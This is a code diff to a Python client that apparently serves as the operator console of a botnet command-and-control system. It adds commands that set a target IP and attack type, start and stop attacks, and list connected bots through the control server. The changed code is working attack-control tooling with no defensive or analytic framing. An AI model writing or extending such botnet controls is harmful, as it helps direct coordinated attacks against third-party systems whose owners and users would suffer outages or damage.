@@ -13,6 +13,9 @@ class Send(threading.Thread):
     def __init__(self, sock: socket.socket) -> None:
         super().__init__()
         self.sock = sock
+        self.attktype = ''
+        self.targetip = ''
+
 
     def run(self):
         print('Can enter commands now.')
@@ -20,16 +23,39 @@ class Send(threading.Thread):
             sys.stdout.flush()
             message = sys.stdin.readline()[:-1]
 
-            if message.upper() == 'QUIT':
-                # TODO: send message to server that socket is leaving
-                break
+            if message.upper() == 'DISCONNECT':
+                self.disconnect()
+                print('Quitting...')
+                self.sock.close()
+                os._exit(0)
             else:
                 self.sock.sendall(message.encode(ENCODING))
 
-        print('Quiting...')
-        self.sock.close()
-        os._exit(0)
+    
+    def changeip(self):
+        self.sock.sendall(f'changeip:{self.targetip}'.encode(ENCODING))
+        print(f'Client: sending changeip:{self.targetip}')
 
+
+    def changeattk(self):
+        self.sock.sendall(f'changeattk:{self.attktype}'.encode(ENCODING))
+        print(f'Client: sending changeattk:{self.attktype}')
+
+
+    def startattk(self):
+        self.sock.sendall('startattk:'.encode(ENCODING))
+        print('Client: sending iam')
+    
+
+    def stopattk(self):
+        self.sock.sendall('stopattk:'.encode(ENCODING))
+        print('Client: sending stopattk')
+
+
+    def disconnect(self):
+        self.sock.sendall('disconnect:'.encode(ENCODING))
+        print('Disconnecting...')
+        
 
 class Receive(threading.Thread):
 
@@ -38,10 +64,18 @@ class Receive(threading.Thread):
         self.sock = sock
         self.client_type = client_type
         self.client = client
+        self.botlist = '' 
 
     def run(self) -> None:
         while True:
-            recv_data = self.sock.recv(RECV_BUFFER)
+            try:
+                recv_data = self.sock.recv(RECV_BUFFER)
+            except ConnectionResetError:
+                print("An existing connection was forcibly closed by the remote host")
+                print('Quiting...')
+                self.sock.close()
+                os._exit(0)
+
 
             if recv_data:
                 self._req_handler(recv_data)
@@ -68,6 +102,13 @@ class Receive(threading.Thread):
                     print('Quitting...')
                     self.sock.close()
                     os._exit(0)
+            elif req_type == 'listbot':
+                if len(request[1]):
+                    self.botlist = request[1]
+                    print(f'Bots:\n{self.botlist}')
+                else:
+                    print("No bots connected")
+
             else:
                 print(
                     f'\rReceived command/response -> {recv_data_str}')
@@ -102,6 +143,7 @@ class Client:
             print("caught keyboard interrupt, exiting")
             self.sock.close()
             os._exit(0)
+        
 
     def set_authenticated(self) -> None:
         self.authenticated = True
